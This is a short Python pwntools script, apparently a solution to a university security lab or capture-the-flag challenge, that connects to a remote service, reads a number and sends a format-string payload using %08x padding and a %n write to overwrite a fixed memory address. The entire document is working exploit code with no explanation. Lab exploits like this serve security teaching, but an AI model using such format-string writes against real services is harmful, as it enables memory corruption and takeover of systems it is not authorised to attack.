from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22196

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

number = s.recvline().decode('utf-8').split(" ")[-1:][0][:-1]
number = int(number, 16)
print("Number: ", number)

address = p32(0x0804a070) # 4
missing_chars = str(number-44).encode('utf-8')

s.sendline(address+b'%08x'*5+b'%'+missing_chars+b'x'+b'%n')
result = s.recvall()
print(result)

